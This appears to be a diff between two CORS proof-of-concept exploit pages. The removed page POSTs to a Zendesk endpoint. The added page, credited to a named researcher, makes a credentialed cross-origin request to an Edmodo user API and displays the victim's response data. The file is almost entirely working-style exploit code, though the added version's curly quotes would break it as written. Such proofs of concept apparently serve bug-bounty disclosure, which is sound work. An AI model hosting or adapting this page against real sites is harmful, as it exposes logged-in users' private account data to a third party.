@@ -1,22 +1,31 @@
-<!DOCTYPE html> 
-<html> 
-<body> 
-<center> 
-<h2>CORS POC Exploit</h2>
-<div id="demo"> 
-<button type="button" onclick="cors()">Exploit</button>
- </div>  
-<script> function cors() { 
-  var xhttp = new XMLHttpRequest(); 
-  xhttp.onreadystatechange = function()
-  {     
-    if (this.readyState == 4 && this.status == 200) { 
-            document.getElementById("demo").innerHTML = alert(this.responseText);
-     }   
-    };  
-   xhttp.open("POST", "https://hackerearth.zendesk.com/embeddable_blip?type=userAction&data=eyJjaGFubmVsIjoid2ViX3dpZGdldCIsInVzZXJBY3Rpb24iOnsiY2F0ZWdvcnkiOiJhcGkiLCJhY3Rpb24iOiJ6RS5oaWRlIiwibGFiZWwiOm51bGwsInZhbHVlIjp7ImFyZ3MiOm51bGx9fSwiYnVpZCI6ImU4MTA2ZTlmNGVlMGFjMDYzNDYzZDQ3OWQ2NzkwZTE2Iiwic3VpZCI6ImEyNWI2ZjUzYzU0Y2VlYWViNTk1NDZjNDNkZWEzOGJiIiwidmVyc2lvbiI6IjNkNzE1OGI2YiIsInRpbWVzdGFtcCI6IjIwMjAtMDUtMjlUMTc6MTE6MzYuMzk4WiIsInVybCI6Imh0dHBzOi8vd3d3LmhhY2tlcmVhcnRoLmNvbSJ9", true);    
-   xhttp.send(); 
-}
-</script> 
-</body> 
-</html>
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+    <title>CORS PoC Exploit</title>
+    </head>
+    <body>
+    <center>
+
+    <h1>CORS Exploit<br>Yeasir Arafat</h1>
+    <hr>
+    <div id=”demo”>
+    <button type=”button” onclick=”cors()”>Exploit</button>
+    </div>
+    <script type=”text/javascript”>
+    function cors() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if(this.readyState == 4 && this.status == 200) {
+    document.getElementById(“demo”).innerHTML = this.responseText;
+    }
+    };
+    xhttp.open(“GET”, “https://api.edmodo.com/users/id", true);
+    xhttp.withCredentials = true;
+    xhttp.send();
+    }
+    </script>
+
+    </center>
+    </body>
+    </html>
